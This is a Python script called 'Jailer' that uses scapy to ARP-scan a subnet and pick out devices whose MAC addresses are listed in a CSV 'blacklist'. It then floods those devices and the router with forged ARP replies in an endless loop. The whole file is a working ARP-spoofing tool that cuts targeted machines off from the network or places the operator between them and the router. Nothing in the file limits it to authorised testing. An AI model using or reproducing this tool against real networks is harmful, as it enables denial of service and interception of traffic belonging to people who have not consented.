import os
import sys
from scapy.all import*
import csv
import re
import ipaddress
import argparse
from shutil import which

class Jailer:
    all_computer = "ff:ff:ff:ff:ff:ff"

    def __init__(self, initIP, cidr, routerIP, interval=300):
        self.initIP = initIP
        self.cidr = cidr
        self.routerIP = routerIP
        self.interval = interval
        self.blacklist = self.getBlacklist()
        self.checkTCPDump()

    def checkTCPDump(self):
        try:
            if which("tcpdump") is None:
                raise Exception
        except Exception:
            print(f"{self.getTime()} >>> {sys.argv[0]} needs TCPDump")
            sys.exit()
    
    @staticmethod
    def getBlacklist():
        blacklist = list()

        with open("jail.csv",newline="") as f:
            reader = csv.reader(f)
            for row in reader:
                blacklist.append(row[0])

        return blacklist 

    @staticmethod
    def getTime():
        return time.strftime("%H:%M:%S", time.localtime())

    def jail(self):
        router = {"ip":self.routerIP,"mac":self.findMAC(self.routerIP)}
        found, not_found, time_elapsed = self.findIP(self.blacklist)

        print(f"{self.getTime()} >>> {len(found)}/{len(self.blacklist)} "
              f"found in {time_elapsed:.2f}s")

        timer = time.time()
        while time.time() <= timer + self.interval:
            for _ in found:
                if self.isAlive(_):
                    self.spoof(router, _)
                    time.sleep(1)
            
            # avoid 99% cpu usage
            time.sleep(0.2)
                    
    def execute(self):
        while 1:
            try:
                self.jail()
                print(f"{self.getTime()} >>> rescanning...")
            except KeyboardInterrupt:
                print("======= unjailed! ========")
                sys.exit()


    def findIP(self, MAC):
        start = time.time()
        not_found = list(MAC)
        found = list()

        ans, unans = srp(Ether(dst=Jailer.all_computer)/ARP(pdst=self.initIP+"/"+self.cidr),timeout=2, verbose=False)
        for s,r in ans:
            for _ in MAC:
                mac_temp = r[Ether].src
                if mac_temp == _:
                    not_found.remove(mac_temp)
                    found.append({"ip":r[Ether].psrc, "mac":mac_temp})
        
        end = time.time()
        time_elapsed = end - start
        return found, not_found, time_elapsed

    @staticmethod
    def findMAC(IP):
        ans, unans = arping(IP, verbose=False)
        for s, r in ans:
            return r[Ether].src

    @staticmethod
    def isValidMAC(mac):
        mac_regx = re.compile(r'^([0-9A-F]{1,2})' + '\:([0-9A-F]{1,2})'*5 + '$', re.IGNORECASE)

        if mac_regx.match(mac):
            return True
        else:
            return False

    @staticmethod
    def isValidIP(IP):
        try: 
            ipaddress.ip_address(IP)
            return True
        except ValueError:
            return False

    @staticmethod
    def isAlive(victim):
        ans, unans = arping(victim.get("ip"), verbose=False)
        if len(ans) and victim.get("mac") == ans[0][1][Ether].src:
            return True
        else:
            return False

    @staticmethod
    def spoof(router, victim):
        # router = {"ip":"", "mac":""}
        send(ARP(op =2, pdst = victim.get("ip"), psrc = router.get("ip"), hwdst = victim.get("mac")), verbose=False)
        send(ARP(op = 2, pdst = router.get("ip"), psrc = victim.get("ip"), hwdst = router.get("mac")), verbose=False)


if __name__ == "__main__":
    routerIP = "10.2.255.254"
    initIP = "10.2.1.0"
    cidr="24"
    interval = 90

    parser = argparse.ArgumentParser()
    parser.add_argument('--interval', type=int, default=90, help="interval")
    parser.add_argument('--router', default="10.2.255.254", help="router IP")
    parser.add_argument('--init', default="10.2.1.0", help="initial IP")
    parser.add_argument('--cidr', default="24")
    args = parser.parse_args()

    # jail(routerIP, interval)
    j = Jailer(args.init, args.cidr, args.router, args.interval)
    j.execute()
        

